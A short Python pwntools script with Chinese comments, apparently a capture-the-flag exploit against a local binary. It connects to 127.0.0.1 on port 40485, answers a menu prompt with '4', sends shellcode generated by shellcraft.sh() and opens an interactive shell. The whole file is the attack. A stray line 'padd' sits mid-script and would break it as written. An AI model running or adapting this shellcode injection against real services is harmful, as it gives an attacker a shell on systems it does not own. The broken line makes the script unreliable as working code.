from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",40485)          

io.recvuntil(b"wisely!")
io.sendline('4')
padd
io.recvuntil(b"you just set.")
payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()                